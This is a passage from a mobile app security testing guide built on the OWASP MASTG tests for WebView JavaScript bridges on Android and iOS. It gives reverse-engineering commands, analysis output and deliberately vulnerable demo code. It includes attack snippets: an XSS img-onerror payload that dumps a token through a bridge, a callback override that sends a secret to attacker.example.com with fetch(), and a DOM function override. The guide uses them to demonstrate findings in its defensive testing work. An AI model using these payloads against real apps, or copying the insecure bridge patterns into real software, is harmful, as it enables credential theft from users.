| React Native (`react-native-webview`) | `addJavascriptInterface` object `ReactNativeWebView` when `onMessage` is set | Message handler `ReactNativeWebView`, wrapped as `window.ReactNativeWebView.postMessage(string)` | `originWhitelist` controls navigation, not messaging; the `onMessage` callback receives `nativeEvent.url` and must check it | The JS bundle (`assets/index.android.bundle`, `main.jsbundle`, Hermes bytecode needs a decompiler): grep `onMessage`, `injectedJavaScript`, `injectedJavaScriptBeforeContentLoaded`, `injectedJavaScriptForMainFrameOnly`, `originWhitelist`, `webviewDebuggingEnabled` |
| Flutter (`webview_flutter`) | `addJavascriptInterface` per `addJavaScriptChannel(name, …)` | `WKScriptMessageHandler` per channel | App code in Dart; channel names are in `libapp.so` strings | `strings libapp.so` / `App.framework/App` for channel names, then test them at runtime |

In all four the injected JavaScript can be read: React Native's `injectedJavaScript` strings sit in the bundle, Cordova's and Capacitor's in `www`/`public`. Look there for tokens and for the functions page code is expected to call. The runtime test in [GT-0033-1](#gt-0033-1-enumerating-and-calling-bridges-at-runtime-and-proving-origin-restriction-android-and-ios) works unchanged on hybrid apps and is usually the fastest way to see what a plugin set really exposes.

## Tests

> **Note:** OWASP currently files all six tests below under MASWE-0034 (WebViews allowing access to local resources). We document them here because each one tests a bridge or the data a bridge moves between native code and page JavaScript, which is what MASWE-0033 is about. The [MASWE-0034 note](/mobile/maswe-0034-webviews-allow-access-to-local-resources/) points back here.

The OWASP tests are static: they find the API calls and leave the "is it sensitive, is it reachable" judgement to manual review. They replace two legacy v1 tests:

| Legacy v1 test (deprecated) | Covered by |
|---|---|
| [MASTG-TEST-0033](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0033/) Testing for Java Objects Exposed Through WebViews (Android) | MASTG-TEST-0334 |
| [MASTG-TEST-0078](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0078/) Determining Whether Native Methods Are Exposed Through WebViews (iOS) | MASTG-TEST-0376, 0377, 0378, 0379, 0380 |

Both legacy tests had a dynamic half (inject a payload into the page and call the bridge) that the new ones dropped. We restore it as [GT-0033-1](#gt-0033-1-enumerating-and-calling-bridges-at-runtime-and-proving-origin-restriction-android-and-ios), because a bridge hit in jadx or r2 is a candidate, and calling it from an origin you control is what turns it into a finding you can rate. iOS has three tests on native-to-page data flows that Android lacks; [GT-0033-2](#gt-0033-2-native-to-page-data-flows-on-android-android) covers the Android side.

### Before you start: inventory every WebView and bridge

One pass gives you candidates for all the tests. On Android:

```bash
# Pull the app (all splits) and decompile
adb shell pm path com.example.app
adb pull /data/app/~~XXXX/com.example.app-YYYY/base.apk
jadx -d out base.apk
apktool d base.apk -o apk_out
grep -E 'minSdkVersion|targetSdkVersion' apk_out/apktool.yml

# Bridges, native-to-page script, and the JavaScript switch, outside AndroidX/Kotlin
grep -rnE 'addJavascriptInterface|@JavascriptInterface|removeJavascriptInterface|addWebMessageListener|WEB_MESSAGE_LISTENER|postWebMessage|createWebMessageChannel|addDocumentStartJavaScript|evaluateJavascript|loadUrl\("javascript:|setJavaScriptEnabled\(true\)|onJsPrompt|onPermissionRequest' \
    out/sources/ | grep -vE '^out/sources/(androidx|kotlin|kotlinx)/' > bridge-hits.txt

# Smali view, useful when jadx fails on a class
grep -rln 'Landroid/webkit/JavascriptInterface;' apk_out/smali*/
```

`WEB_MESSAGE_LISTENER` is a string constant in `WebViewFeature`; it survives obfuscation and leads you to `addWebMessageListener` call sites even when AndroidX classes are renamed. For each WebView, write down: the bridge objects and their names, the JavaScript flag, every URL source (`loadUrl`, `loadDataWithBaseURL` base URLs, intent extras, deep link parameters, server responses), and the navigation policy in `shouldOverrideUrlLoading`. That table is your reachability evidence.

On iOS:

```bash
unzip -q App.ipa -d ipa
BIN=ipa/Payload/App.app/App
otool -l "$BIN" | grep -A4 LC_ENCRYPTION_INFO      # cryptid 0 = decrypted

# Bridge and script selectors, in the app and every embedded framework
for f in "$BIN" ipa/Payload/App.app/Frameworks/*.framework/*; do
  file "$f" | grep -q Mach-O || continue
  echo "== $f"
  strings - "$f" | grep -E 'addScriptMessageHandler|addScriptMessageHandlerWithReply|addUserScript|initWithSource:injectionTime|evaluateJavaScript|callAsyncJavaScript|messageHandlers|WKContentWorld|worldWithName|setInspectable' | sort -u
done

# Bundled web content and injected scripts
find ipa/Payload/App.app -name '*.html' -o -name '*.js' | head -50
grep -rlE 'messageHandlers|ReactNativeWebView|cordova\.exec|Capacitor' ipa/Payload/App.app 2>/dev/null
```

Handler names are usually plain string literals near the registration call; MASTG-TEST-0376 shows how to tie them together with radare2.

### MASTG-TEST-0334: Native Code Exposed Through WebViews (Android)

Source: [MASTG-TEST-0334](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0334/). Platform: Android. Type: static (code) with manual review. Knowledge: MASTG-KNOW-0018. Best practices: MASTG-BEST-0035, MASTG-BEST-0012 (and 0011, 0013 for file and content access, covered in the MASWE-0034 note).

#### Overview

The test looks for WebViews that enable JavaScript and register an object with `addJavascriptInterface`, then reviews every `@JavascriptInterface` method for what it does and whether untrusted content can call it. OWASP's test is scoped to the legacy bridge. We extend the review in step 4 to `addWebMessageListener` origin rules and `postWebMessage` target origins, because an over-broad rule set has the same reach as the legacy bridge and the same test procedure finds it.

#### Prerequisites

- The APK decompiled with jadx ([MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/), [MASTG-TECH-0017](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0017/)) and apktool for the manifest.
- semgrep ([MASTG-TOOL-0110](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0110/)) with the OWASP rule `mastg-android-webview-bridges.yml`, or grep ([MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/)).
- jadx-gui for review ([MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/)).
- Your list of security-relevant contexts (what counts as sensitive data and actions in this app), which OWASP lists as a prerequisite for the evaluation.

#### Steps

1. **Run the OWASP rule** over the decompiled sources:

   ```bash
   semgrep -c mastg-android-webview-bridges.yml out/sources/ --max-lines-per-finding 20
   ```

   The rule has two parts. `mastg-android-webview-bridges-setup` matches `$WEBVIEW.addJavascriptInterface($BRIDGE, $_)` inside a method that also calls `$WEBVIEW.getSettings().setJavaScriptEnabled(true)`; `mastg-android-webview-bridges-javascriptinterface` matches every method annotated with `@JavascriptInterface`. The first part misses apps that enable JavaScript in a different method (a WebView factory, a custom `WebView` subclass, a base activity), so always cross-check with the grep from the inventory.

2. **Check the platform levels.** If `minSdkVersion` or `targetSdkVersion` is below 17 and a bridge exists, the reflection attack applies and you can stop rating there.

3. **Review every exposed method** in jadx-gui. For each one record: what it reads or changes (stored tokens, personal data, files, settings, network calls on the user's behalf, component launches, permission-gated APIs), its parameters and how they are validated, and what it returns. Follow returned objects: a method returning a Java object exposes that object's annotated methods too. Note any URL check inside the method, and whether it relies on `getUrl()`.

4. **Check origin-scoped bridges as well.** For `addWebMessageListener` calls, read the `allowedOriginRules` set: `"*"`, `http://` rules, broad `*.` wildcards, custom schemes. Read the listener: does it check `sourceOrigin` and `isMainFrame` before acting? For `postWebMessage`, note the target origin (`"*"`, `Uri.EMPTY`) and where message ports go.

5. **Establish reachability.** From each WebView with a bridge, find the URLs it loads and whether it can show anything else: links followed inside the WebView (a `WebViewClient` without a restrictive `shouldOverrideUrlLoading`), URLs taken from intent extras or deep links, `loadDataWithBaseURL` with HTML built from server or user data, third-party scripts and iframes in the pages it loads (load them in a desktop browser and list script and frame origins). The detailed entry-point tests are in [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/); here you only need to know whether any path exists.

6. **Confirm at runtime** with [GT-0033-1](#gt-0033-1-enumerating-and-calling-bridges-at-runtime-and-proving-origin-restriction-android-and-ios): the bridge object is present, the method works, and it works from a frame or page on an origin you control.

#### Observation

The semgrep and grep output with file and line numbers, the manifest SDK levels, the decompiled body of each exposed method with a one-line statement of what it does, the origin rules of any message listener, the URL sources of each bridged WebView, and the runtime evidence from GT-0033-1.

#### Evaluation

The test **fails** if all of these hold, as OWASP states: JavaScript is enabled on the WebView, `addJavascriptInterface` is used at least once, and at least one `@JavascriptInterface` method handles sensitive data or performs a sensitive action and is reachable from untrusted content. By extension, it also fails for an `addWebMessageListener` whose origin rules or missing listener checks let untrusted content (another origin, an HTTP origin, an untrusted subdomain, an untrusted frame) reach a sensitive operation, and in every case where the app's SDK levels allow the reflection attack.

It **passes** if no bridge exists, if the bridged WebView can only ever display the app's own content with no third-party scripts or frames and no way to navigate elsewhere, or if the exposed methods are not sensitive (a tap notification, a layout height). A legacy bridge that passes because of reachability alone is still worth an observation recommending `addWebMessageListener`: the next feature that adds a link or an iframe will break the assumption.

OWASP's well-known challenges apply and are worth repeating: bridges registered through wrappers or reflection that static analysis cannot resolve, several WebViews with different settings created in different places, and obfuscated or dynamically loaded code. The runtime hooks in GT-0033-1 close most of these gaps.

#### Demo

[MASTG-DEMO-0097](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0097/MASTG-DEMO-0097/). A "Contact Support" page in a WebView, with a bridge that returns stored profile data and a token, submits messages, and writes preferences. The page also contains a deliberate XSS: it writes the email field into `innerHTML`. Shortened from the OWASP sample (we replaced the demo's sample JWT with a placeholder):

```kotlin
inner class SupportBridge {
    @JavascriptInterface
    fun getUserProfileJson(): String = JSONObject().apply {
        put("name", prefs.getString("name", ""))
        put("email", prefs.getString("email", ""))
        put("jwt", prefs.getString("jwt", ""))          // credential handed to page script
    }.toString()

    @JavascriptInterface
    fun submitSupportMessage(email: String, message: String): String =
        JSONObject().apply { put("status", "ok") }.toString()

    @JavascriptInterface
    fun updateSupportPreference(value: String) {
        prefs.edit { putString("support_preference", value) }   // arbitrary write
    }
}

webView.settings.javaScriptEnabled = true
webView.addJavascriptInterface(SupportBridge(), "MASBridge")
webView.loadDataWithBaseURL("https://appassets.androidplatform.net/assets/support/",
    demoHtml, "text/html", "utf-8", null)
```

Typing `<img src=x onerror='document.getElementById("resultText").innerText = MASBridge.getUserProfileJson()'>` into the email field and sending runs attacker markup in the page, which calls the bridge and displays the token; a real payload would `fetch()` it to a server. The OWASP rule over the decompiled Java reports four findings (abridged):

```text
MastgTestWebView_reversed.java
❯❱ rules.mastg-android-webview-bridges-javascriptinterface
      [MASVS-PLATFORM-2] Method is exposed to JavaScript via @JavascriptInterface
       37┆ @JavascriptInterface
       38┆ public final String getUserProfileJson() throws JSONException {
       58┆ @JavascriptInterface
       59┆ public final String submitSupportMessage(String email, String message) throws JSONException
       71┆ @JavascriptInterface
       72┆ public final void updateSupportPreference(String value) {
❯❱ rules.mastg-android-webview-bridges-setup
      [MASVS-PLATFORM-2] WebView has JavaScript enabled and a native bridge is registered via
      addJavascriptInterface()
       85┆ webView.addJavascriptInterface(new SupportBridge(), "MASBridge");
```

The test fails: JavaScript is on, the bridge has no origin restriction, and it exposes a credential, an action on the user's behalf, and an arbitrary preference write. OWASP's evaluation makes a point worth keeping: moving this bridge to `addWebMessageListener` with a strict origin list would *not* stop this particular exploit, because the injected script runs in the page's own (allowed) origin. It would stop the broader class (another origin, an untrusted iframe, a page reached by navigation). The XSS has to be fixed in the page, and the token should not be available to page script at all.

### MASTG-TEST-0376: References to Native Bridge APIs in WebViews (iOS)

Source: [MASTG-TEST-0376](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0376/). Platform: iOS. Type: static (code). Knowledge: MASTG-KNOW-0076. Best practice: MASTG-BEST-0058.

#### Overview

The test finds every message handler the app registers on a `WKUserContentController` and reviews what each handler's `userContentController(_:didReceive:)` exposes. The OWASP text names `add(_:name:)` only; search for all three registration selectors, because handlers registered in a named content world or with reply are bridges too (and the world tells you who can see them).

#### Prerequisites

- A decrypted IPA, extracted ([MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)).
- radare2 ([MASTG-TOOL-0073](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0073/)) for static analysis ([MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/)) and disassembly review ([MASTG-TECH-0076](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0076/)), or Ghidra / Hopper.
- Your list of security-relevant contexts.

#### Steps

1. **Find the registration selectors and their callers.** OWASP's r2 script from the demo, generalised:

   ```text
   e asm.bytes=false
   e scr.color=false
   e bin.relocs.apply=true
   ?e Registration selectors:
   f~addScriptMessageHandler
   ?e Callers of addScriptMessageHandler:name:
   axt @ reloc.fixup.addScriptMessageHandler:name:
   ```

   ```bash
   r2 -q -e bin.relocs.apply=true -i bridges.r2 -A "$BIN" > bridges.txt
   ```

   r2 truncates long flag names (the demos show `reloc.fixup.evaluateJavaScript:completionHa`), so copy the exact flag from the `f~` output into the `axt` line, and add one `axt` per selector you found: `addScriptMessageHandler:contentWorld:name:`, `addScriptMessageHandlerWithReply:contentWorld:name:`. `-A` (full analysis) on a large binary can take many minutes; run it once interactively and save a project with `Ps <name>` so later scripts can reuse it.

2. **Recover handler names and classes.** Disassemble around each call site (`pd-- 20 @ <address>`): the handler name is the string literal loaded just before the `objc_msgSend`, and the handler class is the object allocated just before that. In Swift binaries look for the class's allocator (`sym.<Module>.<Class>.allocator`).

3. **Read each handler.** Find `userContentController:didReceiveScriptMessage:` (or `…replyHandler:`) on that class and work out: which `action` values or message shapes it accepts, what it does for each, what it returns and how (reply handler, `evaluateJavaScript` callback), whether it reads `frameInfo` / `securityOrigin` / `isMainFrame`, and whether it validates types and values.

4. **Establish reachability**: what the web view loads (`loadHTMLString` base URLs, `load(_:)` URLs and where they come from, `WKNavigationDelegate` policy), whether app-bound domains are declared (`plutil -p ipa/Payload/App.app/Info.plist | grep -A12 WKAppBoundDomains`), whether pages include third-party scripts or frames, and whether the handler was registered in `.page` or in an isolated world.

5. **Confirm at runtime** with GT-0033-1.

#### Observation

The list of registration call sites with handler name, handler class and content world; for each handler, the actions it supports and what they do; the origin checks present (or absent); the content each web view loads.

#### Evaluation

The test **fails** if a handler exposes sensitive data or functionality (credentials, tokens, stored secrets, privileged native operations, writes to sensitive state) to JavaScript that untrusted content can run, without adequate validation of the message and its origin. OWASP is explicit that registering a handler is not insecure in itself: it **passes** when the exposed functionality is not security-relevant, or when it is reachable only from trusted content, with origin and frame checks and input validation in place. A handler in an isolated content world that only the app's own user script calls, and that checks the frame origin, is the strongest pass.

#### Demo

[MASTG-DEMO-0142](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0142/MASTG-DEMO-0142/). A handler named `bridge` with two actions that return secrets, registered unconditionally in the page world (secret values shortened):

```swift
class SecretBridgeHandler: NSObject, WKScriptMessageHandler {
    func userContentController(_ userContentController: WKUserContentController,
                               didReceive message: WKScriptMessage) {
        guard let body = message.body as? [String: String],
              let action = body["action"] else { return }
        switch action {
        case "getSecret":
            let secret = "MASTG_API_KEY=…"
            message.webView?.evaluateJavaScript("window.receiveSecret('\(secret)')",
                                                completionHandler: nil)
        case "getCredentials":
            let credentials = "user=admin&pass=…"
            message.webView?.evaluateJavaScript("window.receiveCredentials('\(credentials)')",
                                                completionHandler: nil)
        default: break
        }
    }
}

config.userContentController.add(SecretBridgeHandler(), name: "bridge")   // .page world, all frames
```

The r2 output ties the selector to the registering function and shows the name literal:

```text
xrefs to 'addScriptMessageHandler:name:':
sym.MASTestApp.MastgTest.showWebView..._ 0x1eac [DATA:r--] ldr x1, reloc.fixup.addScriptMessageHandler:name:

│  0x00001e5c  bl sym.MASTestApp.SecretBridgeHandler.allocator._...cfC_
│  0x00001e68  add x0, x0, 0x98d          ; 0x1498d ; "bridge"
│  0x00001eac  ldr x1, [x8, 0x2e0]        ; "addScriptMessageHandler:name:" ; char *selector
│  0x00001eb0  bl sym.imp.objc_msgSend
```

The test fails: any script in any frame can call `window.webkit.messageHandlers.bridge.postMessage({action: 'getSecret'})`, and the handler checks neither the message origin nor the frame. In the demo the page is a local string, which limits the immediate impact; as soon as the web view shows attacker-influenced content, the secrets are one `postMessage` away.

### MASTG-TEST-0377: References to evaluateJavaScript Used as Bridge Reply in WKScriptMessageHandler (iOS)

Source: [MASTG-TEST-0377](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0377/). Platform: iOS. Type: static (code) with manual review. Knowledge: MASTG-KNOW-0076, MASTG-KNOW-0139. Best practice: MASTG-BEST-0062.

#### Overview

A one-way `WKScriptMessageHandler` that needs to answer usually does it by calling a global JavaScript function: `evaluateJavaScript("window.receiveSecret('…')")`. That function lives in the page world. Any script on the page can replace it before the native side fires it, and then receives the data:

```javascript
// Injected or third-party script, run before the app replies
window.receiveSecret = function (secret) {
    fetch("https://attacker.example.com/?leak=" + encodeURIComponent(secret));
};
window.webkit.messageHandlers.bridge.postMessage({action: "getSecret"});
```

The attacker does not even need to know how to call the bridge: if the legitimate page triggers it, overriding the callback is enough. The test looks for `evaluateJavaScript:completionHandler:` calls made from inside message handlers, with sensitive data in the script string. A second problem comes free with the pattern: interpolating a native value into the script source is a JavaScript injection sink if the value can contain `'` or `\`.

#### Prerequisites

As for MASTG-TEST-0376: decrypted, extracted binary; radare2 or another disassembler; the handler list from 0376.

#### Steps

1. **List the call sites** of `evaluateJavaScript:completionHandler:` and their enclosing functions (OWASP's `evaluate_js_callback.r2`):

   ```text
   e bin.relocs.apply=true
   f~evaluateJavaScript
   axt @ reloc.fixup.evaluateJavaScript:completionHa
   ```

   Add the world-aware selector `evaluateJavaScript:inFrame:inContentWorld:completionHandler:` and `callAsyncJavaScript:arguments:inFrame:inContentWorld:completionHandler:` if present: a reply sent with these into `.page` has the same problem.

2. **Keep the call sites inside handlers.** An `axt` result whose function symbol contains `userContentController` and `didReceive` (Swift mangles it as `…userContentController…didReceive…WKScriptMessage…`) is a reply from a bridge. For calls in helper functions, follow `axt` on the helper back to a handler.

3. **Read what is sent.** Disassemble from the start of each case (`pd 105 @ <address>`) and look for the string literals that form the script (`"window.receiveSecret('"`), the interpolated values, and where they come from (Keychain reads, `UserDefaults`, network responses, hard-coded strings).

4. **Confirm dynamically**: in Safari Web Inspector (GT-0033-1), define the callback yourself and trigger the action; the value appearing in your function proves interception.

#### Observation

Call sites of `evaluateJavaScript` within message handlers, the script template and data each one sends, and the source of that data.

#### Evaluation

The test **fails** if a message handler uses `evaluateJavaScript:completionHandler:` (or another page-world evaluation) to deliver data that is, or is derived from, sensitive data. It **passes** if handlers reply through `WKScriptMessageHandlerWithReply`, or the data sent back is not sensitive. Note for the report whether interpolated values are escaped (for example by JSON-encoding them); unescaped interpolation is a separate injection issue even when the data is not secret.

#### Demo

[MASTG-DEMO-0143](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0143/MASTG-DEMO-0143/) reuses the binary and handler of DEMO-0142. Both reply paths come from the handler (output abridged):

```text
xrefs to 'evaluateJavaScript:completionHandler:':
sym.MASTestApp.SecretBridgeHandler.userContentController.allocator.didReceive...WKScriptMessageCtF 0x1698
sym.MASTestApp.SecretBridgeHandler.userContentController.allocator.didReceive...WKScriptMessageCtF 0x18ec

|  0x00001514  add x0, x0, 0x930   ; "MASTG_API_KEY=072037ab-…"
|  0x00001550  bl sym.imp.DefaultStringInterpolation.literalCapacity.interpolationCount_...
|  0x0000156c  add x0, x0, 0x970   ; "window.receiveSecret('"
```

The test fails: the API key and the credentials are interpolated into `window.receiveSecret('…')` and `window.receiveCredentials('…')`, global page functions any script can redefine. The fix is in [MASTG-BEST-0062](#mastg-best-0062-use-wkscriptmessagehandlerwithreply-to-return-data-to-javascript).

### MASTG-TEST-0378: References to Password Fields in WebView-Loaded HTML (iOS)

Source: [MASTG-TEST-0378](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0378/). Platform: iOS. Type: static (code) with manual review. Knowledge: MASTG-KNOW-0076, MASTG-KNOW-0139. Best practices: MASTG-BEST-0059, MASTG-BEST-0060.

#### Overview

An `<input type="password">` in a `WKWebView` holds what the user types in its `.value`, and every script in that page can read it, with no bridge involved. The test looks for password-field markup the app ships and loads into a web view, and checks whether the app instead takes the input in a native secure text field. It belongs in this note because it is about sensitive data placed inside the page's JavaScript context, which MASWE-0033 lists as a mode of introduction; how sensitive data in the UI is protected more generally is in [MASWE-0036](/mobile/maswe-0036-sensitive-data-exposed-via-ui/).

#### Prerequisites

The extracted bundle and binary; `strings` or `rabin2 -zz` ([MASTG-TECH-0071](https://mas.owasp.org/MASTG/techniques/generic/MASTG-TECH-0071/)); radare2 to follow references.

#### Steps

1. **Find password markup** in the binary's string table and in bundled files:

   ```bash
   rabin2 -zz "$BIN" | grep -iE "type=[\"']password[\"']"
   grep -rliE "type=[\"']password[\"']" ipa/Payload/App.app --include='*.html' --include='*.js'
   ```

   OWASP's r2 variant: `iz~input type="password"`, then `axt @ <string address>` to find the function that uses the HTML constant.

2. **Confirm it reaches a web view.** From the referencing function, follow the string into `loadHTMLString:baseURL:` (or a file written and loaded with `loadFileURL:allowingReadAccessToURL:`). For remote pages the binary contains nothing; test those dynamically: in Web Inspector, type into the field and run `document.querySelector('input[type=password]').value` in the console.

3. **Look for a native overlay**: a `WKUserScript` that listens for `focus` on sensitive inputs, a handler receiving coordinates, and a `UITextField` with `isSecureTextEntry = true` added over the web view (`setSecureTextEntry:` in the binary).

4. **Assess who else runs script in that page**: third-party scripts, injected app scripts in `.page`, and any XSS path.

#### Observation

The locations of password markup, the load call that renders it, and the presence or absence of a native secure-input overlay.

#### Evaluation

As OWASP writes it, the test **fails** if the app renders password fields in a web view without a native input overlay, and **passes** if it intercepts focus and takes the value in a native secure field that never writes it back to the DOM. That bar is strict: almost every web login fails it. In our reports we treat a failure as a finding whose severity follows the script exposure of that page (third-party scripts present, untrusted content possible, a bridge or injected scripts that move the value), and as an observation where the page is app-owned, first-party only and has no injection path. App-shipped HTML login forms for the app's own account are worth challenging anyway: a native login screen, or `ASWebAuthenticationSession` for web-based sign-in, removes the question.

#### Demo

[MASTG-DEMO-0144](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0144/MASTG-DEMO-0144/). The app loads a login form from a string and posts the password over a bridge:

```swift
let html = """
<input type="text" id="username" placeholder="Username" />
<input type="password" id="password" placeholder="Password" />
<button onclick="submitForm()">Sign In</button>
<script>
  function submitForm() {
    const pass = document.getElementById('password').value;   // readable by any page script
    window.webkit.messageHandlers.bridge.postMessage({action: 'login',
        username: document.getElementById('username').value, password: pass});
  }
</script>
"""
webView.loadHTMLString(html, baseURL: nil)
```

r2 finds the HTML constant at `0x10000ac00`, referenced from `MastgTest.showWebView` at `0x100004258`, bridged to `NSString` at `0x100004268` and passed to `loadHTMLString:baseURL:` (selector loaded at `0x100004274`). There is no focus-intercepting user script and no `UITextField` overlay, so the test fails.

### MASTG-TEST-0379: References to evaluateJavaScript Without Content World Isolation (iOS)

Source: [MASTG-TEST-0379](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0379/). Platform: iOS. Type: static (code). Knowledge: MASTG-KNOW-0076, MASTG-KNOW-0139. Best practice: MASTG-BEST-0061.

#### Overview

Here the data flows the other way: native code *reads* the page. When the app runs `evaluateJavaScript("document.querySelector('#recipient').textContent")`, the script executes in `.page`, with the page's copy of `document.querySelector`. A malicious or compromised page can redefine that function, or `Element.prototype.getAttribute`, `JSON.stringify` and so on, before the app's script runs, and the app receives whatever the page wants it to see:

```javascript
document.querySelector = function () { return { textContent: "ATTACKER_CONTROLLED" }; };
```

Running the same script in an isolated world (`evaluateJavaScript(_:in:in:completionHandler:)` with `.defaultClient` or a named world) uses pristine built-ins. It does not stop the page from changing the DOM itself, so values read back still need validation.

#### Prerequisites

As for MASTG-TEST-0376.

#### Steps

1. **List the call sites** of `evaluateJavaScript:completionHandler:` with their enclosing functions (OWASP's `evaluate_js_no_world.r2` is the same `f~` / `axt` pattern as above). List `evaluateJavaScript:inFrame:inContentWorld:completionHandler:` separately: those are candidates for a pass, but check which world is passed (a call with `WKContentWorld.page` is no better).

2. **Read each script string.** Disassemble the instructions before the `objc_msgSend` and identify the script literal loaded into `x2` (the first argument after `self` and `_cmd`). DOM reads look like `document.querySelector`, `getElementById`, `getAttribute`, `.value`, `.textContent`, `.innerHTML`.

3. **Follow the result.** Find the completion block (built just before the call and passed in `x3`) and what native code does with the value: displays it, compares it, sends it to the backend, uses it to decide a payment recipient or a login state.

#### Observation

Each page-world evaluation that reads the DOM, the data read, and its use in native code.

#### Evaluation

The test **fails** if `evaluateJavaScript:completionHandler:` (page world) is used to read DOM content that native code uses in a security-relevant way: account details, credentials, tokens, transaction data, anything that drives a decision. It **passes** if such reads use an isolated content world, or if the values read are not security-relevant. Even with isolation, report reliance on page-supplied values for security decisions as a design issue.

#### Demo

[MASTG-DEMO-0145](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0145/MASTG-DEMO-0145/). The demo simulates the attacker by first evaluating the override itself, then reading a recipient account number in the page world:

```swift
func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
    // Stands in for attacker script on the page
    webView.evaluateJavaScript("""
        document.querySelector = function(selector) { return { textContent: "ATTACKER_CONTROLLED" }; };
    """)
    // FAIL: page world, uses the page's (overridden) querySelector
    webView.evaluateJavaScript("document.querySelector('#recipient_account_number').textContent") { value, _ in
        self.completion?("Recipient Account Number: \(value as? String ?? "unknown")")
    }
}
```

r2 shows both `axt` hits inside `MastgTest.webView(_:didFinish:)`. At the second one (`0x1000048b0`) the selector `evaluateJavaScript:completionHandler:` is loaded into `x1`, the web view into `x0`, the string `"document.querySelector('#recipient_account_number').textContent"` into `x2` and a heap-copied completion block into `x3`. The app receives `ATTACKER_CONTROLLED`; the test fails. The commented-out passing variant calls `evaluateJavaScript(_:in: nil, in: .defaultClient)` and gets the real value.

### MASTG-TEST-0380: References to evaluateJavaScript Writing Sensitive Data into WebView DOM (iOS)

Source: [MASTG-TEST-0380](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0380/). Platform: iOS. Type: static (code) with manual review. Knowledge: MASTG-KNOW-0076, MASTG-KNOW-0139. Best practice: MASTG-BEST-0059.

#### Overview

The app has a secret in native code (a one-time password, an account number, a card number) and shows it by writing it into an element: `document.getElementById('otp').textContent = '…'`. From then on it is in the DOM, which every world shares, so any page script can read it with one line. Running the write in an isolated world does not help, because the DOM is shared. The safe alternative is a native view positioned over the web view, with only layout coordinates read from the page.

#### Prerequisites

As for MASTG-TEST-0376.

#### Steps

1. **List `evaluateJavaScript` call sites** (both selectors) and disassemble the code before each one.
2. **Identify DOM writes**: assignment to `innerHTML`, `textContent`, `innerText`, `value`, or `setAttribute` in the script literal, with an interpolated value appended (Swift string interpolation shows as `DefaultStringInterpolation` / `append` calls between the literal parts).
3. **Trace the value** to its native source and decide whether it is sensitive. Placeholders and static UI strings are not.
4. **Confirm at runtime** by reading the element in Web Inspector after the app has written it.

#### Observation

Each DOM write from native code, the element and property written, and the source and sensitivity of the value.

#### Evaluation

The test **fails** if `evaluateJavaScript` is used to assign sensitive native data (OTP, account number, credential, card data) to a DOM property. It **passes** if sensitive values are rendered natively over the web view, or only non-sensitive values are written.

#### Demo

[MASTG-DEMO-0146](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0146/MASTG-DEMO-0146/):

```swift
webView.evaluateJavaScript(
    "document.getElementById('otp-display').textContent = '\(MastgTest.secretOtp)'",
    completionHandler: nil)
```

```text
│  0x100004914  add x8, x8, 0x570   ; "document.getElementById('otp-display').textContent = '"
│  0x100004930  bl sym.imp.append_...ySSF_
│  0x100004934  mov x0, 0x3834      ; '48'   (OTP digits built as an immediate)
│  0x100004948  bl sym.imp.append_...ySSF_
│  0x100004950  mov w0, 0x27        ; '\''
│  0x100004978  ldr x1, [x8, 0x198] ; "evaluateJavaScript:completionHandler:"
│  0x100004988  bl sym.imp.objc_msgSend
```

The script is assembled from the literal, the OTP and a closing quote, then dispatched at `0x100004988`. The OTP ends up in `#otp-display`, readable by any script on the page; the test fails. The demo's passing variant adds a `UILabel` over the web view instead.

### GT-0033-1: Enumerating and calling bridges at runtime and proving origin restriction (Android and iOS)

Guler Tech methodology. Platform: Android and iOS. Type: dynamic.

#### Overview

Static review tells you which bridges the code registers. This test shows which ones actually exist in each WebView at runtime, what they return when called, and, the part that decides the rating, whether they are still there and still answer when the calling script comes from an origin you control: in an iframe inside the trusted page, and in a page the WebView navigates to. It also catches bridges static analysis misses (framework plugins, reflection, dynamically loaded code) and gives you report evidence that does not depend on reading assembly.

#### Prerequisites

- **Android:** a test device or emulator with USB debugging, desktop Chrome, and either WebView debugging already enabled by the app or Frida ([MASTG-TOOL-0031](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0031/)) on a rooted device to force it. Debugging enabled in a release build is itself a finding ([MASTG-TEST-0227](https://mas.owasp.org/MASTG/tests/android/MASVS-RESILIENCE/MASTG-TEST-0227/), MASVS-RESILIENCE); record it, then use it.
